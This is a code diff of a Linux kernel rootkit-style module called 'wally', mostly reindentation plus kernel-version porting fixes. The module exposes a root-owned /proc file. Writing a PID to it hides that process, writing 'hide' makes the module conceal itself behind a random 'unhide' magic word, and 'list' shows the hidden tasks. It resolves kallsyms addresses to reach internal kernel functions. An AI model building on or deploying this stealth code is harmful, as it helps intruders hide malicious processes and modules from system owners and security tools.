@@ -55,7 +55,7 @@ static struct proc_dir_entry *WallyProcFileEntry;
 struct __lkm_access_t{ struct module *this_mod; };
 static char *magic_word;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,0,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,5,0)
 #error "Unsupported kernel version"
 #endif
 
@@ -84,78 +84,78 @@ WALLY_DECLARE_MOD(wally);
 static char*
 get_unhide_magic_word(void)
 {
-   if(!magic_word)
+    if(!magic_word)
         magic_word = wally_random_bytes(MAX_MAGIC_WORD_SIZE);
 
-   /* magic_word must be freed later */
-   return magic_word;
+    /* magic_word must be freed later */
+    return magic_word;
 }
 
 static int
 proc_dummy_show(struct seq_file *seq, void *data)
 {
-   seq_printf(seq, "Where is Waldo?\n");
-   return 0;
+    seq_printf(seq, "Where is Waldo?\n");
+    return 0;
 }
 
 static int
 open_cb(struct inode *ino, struct file *fptr)
 {
-   return single_open(fptr, proc_dummy_show, NULL);
+    return single_open(fptr, proc_dummy_show, NULL);
 }
 
 static ssize_t
 write_cb(struct file *fptr, const char __user *user, size_t size, loff_t *offset)
 {
-   char buf[MAX_PROCFS_SIZE+1];
-   unsigned long bufsiz = 0;
-   static unsigned int op_lock;
-   pid_t pid;
-   memset(buf, 0, MAX_PROCFS_SIZE+1);
+    char buf[MAX_PROCFS_SIZE+1];
+    unsigned long bufsiz = 0;
+    static unsigned int op_lock;
+    pid_t pid;
+    memset(buf, 0, MAX_PROCFS_SIZE+1);
 
-   bufsiz = size < MAX_PROCFS_SIZE ? size : MAX_PROCFS_SIZE;
+    bufsiz = size < MAX_PROCFS_SIZE ? size : MAX_PROCFS_SIZE;
 
-   if (copy_from_user(buf, user, bufsiz))
-     goto efault_error;
+    if (copy_from_user(buf, user, bufsiz))
+        goto efault_error;
 
-   pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
-   if((pid > 1) && (pid <= 65535 /* 16 bit range pids */))
-     {
+    pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
+    if((pid > 1) && (pid <= 65535 /* 16 bit range pids */))
+    {
         hide_task_by_pid(pid);
-     }
-   else
-     {
+    }
+    else
+    {
         size_t len = strlen(buf) - 1;
         if(!len || (len < 0))
-          goto leave;
+            goto leave;
 
         buf[len] == '\n' ? buf[len] = '\0' : 0;
         if(!strcmp(buf, "hide") && !op_lock)
-          {
-             static unsigned int msg_lock = 0;
-             if(!msg_lock)
-               {
-                  msg_lock = 1;
-                  printk(KERN_WARNING
-                         "Your module \'unhide\' magic word is: '%s'\n", magic_word);
-               }
-             op_lock = 1;
-             wally_hide_mod();
-          }
+        {
+            static unsigned int msg_lock = 0;
+            if(!msg_lock)
+            {
+                msg_lock = 1;
+                printk(KERN_WARNING
+                        "Your module \'unhide\' magic word is: '%s'\n", magic_word);
+            }
+            op_lock = 1;
+            wally_hide_mod();
+        }
         else if(!strcmp(buf, magic_word) && op_lock)
-          {
-             op_lock = 0;
-             wally_unhide_mod();
-          }
+        {
+            op_lock = 0;
+            wally_unhide_mod();
+        }
         else if(!strcmp(buf, "list"))
-          {
-             wally_list_saved_tasks();
-          }
-     }
+        {
+            wally_list_saved_tasks();
+        }
+    }
 leave:
-   return size;
+    return size;
 efault_error:
-   return -EFAULT;
+    return -EFAULT;
 }
 
 /**
@@ -171,43 +171,48 @@ static const struct file_operations proc_file_fops = {
 
 static void do_remove_proc(void)
 {
-   if(WallyProcFileEntry)
-     {
+    if(WallyProcFileEntry)
+    {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
         remove_proc_entry(WALLY_PROC_FILE, NULL);
 #else
         proc_remove(WallyProcFileEntry);
 #endif
-     }
+    }
 }
 
 static int __init wally_init(void)
 {
-   int lock = 0;
+    int lock = 0;
+    //FIXME
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
+    kuid_t kuid;
+    kgid_t kgid;
+#endif
 
-   kall_load_addr(); /* load kallsyms addresses */
-   if(!k_attach_pid)
-     goto addr_error;
+    kall_load_addr(); /* load kallsyms addresses */
+    if(!k_attach_pid)
+        goto addr_error;
 
-   if(!get_unhide_magic_word())
-     goto magic_word_error;
+    if(!get_unhide_magic_word())
+        goto magic_word_error;
 
 
 try_reload:
     WallyProcFileEntry = proc_create(WALLY_PROC_FILE, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
     if(lock && !WallyProcFileEntry)
-      {
-         goto proc_file_error;
-      }
+    {
+        goto proc_file_error;
+    }
     if(!lock)
-      {
-         if(!WallyProcFileEntry)
-           {
-              lock = 1;
-              do_remove_proc();
-              goto try_reload;
-           }
-      }
+    {
+        if(!WallyProcFileEntry)
+        {
+            lock = 1;
+            do_remove_proc();
+            goto try_reload;
+        }
+    }
 
     /* set proc file maximum size & user as root */
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
@@ -215,22 +220,28 @@ try_reload:
     WallyProcFileEntry->uid = 0;
     WallyProcFileEntry->gid = 0;
 #else
-   proc_set_size(WallyProcFileEntry, MAX_PROCFS_SIZE);
-   proc_set_user(WallyProcFileEntry, 0, 0);
+    proc_set_size(WallyProcFileEntry, MAX_PROCFS_SIZE);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
+    kuid.val = 0;
+    kgid.val = 0;
+    proc_set_user(WallyProcFileEntry, kuid, kgid);
+#else
+    proc_set_user(WallyProcFileEntry, 0, 0);
+#endif
 #endif
 
-   goto leave;
+    goto leave;
 proc_file_error:
-   printk(KERN_ERR "Could not create proc file.\n");
-   goto leave;
+    printk(KERN_ERR "Could not create proc file.\n");
+    goto leave;
 addr_error:
-   printk(KERN_ERR "Could not get kernel function address, proc file not created.\n");
-   goto leave;
+    printk(KERN_ERR "Could not get kernel function address, proc file not created.\n");
+    goto leave;
 magic_word_error:
-   printk(KERN_ERR "Could not load magic word. proc file not created\n");
+    printk(KERN_ERR "Could not load magic word. proc file not created\n");
 leave:
-   printk(KERN_INFO "wally loaded.\n");
-   return 0;
+    printk(KERN_INFO "wally loaded.\n");
+    return 0;
 }
 
 static void __exit wally_cleanup(void)
